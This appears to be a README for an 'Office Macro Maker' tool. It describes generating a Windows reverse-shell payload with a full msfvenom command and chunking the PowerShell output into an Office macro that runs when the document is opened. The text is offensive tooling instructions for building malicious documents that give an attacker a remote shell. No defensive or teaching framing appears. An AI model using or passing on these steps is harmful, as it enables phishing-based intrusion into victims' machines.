# Menu

**Office Macro Maker**

This script is setup to break up larger payloads like a msvfenom powershell payload.
`msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f psh-cmd`

When this prints out you can take the powershell command and paste it into the `Str` variable.
This will then chunk the data into a office macro compatible format and also add in a couple other options.

When all is done you can copy paste the entire output into macros and it should execute once opened.
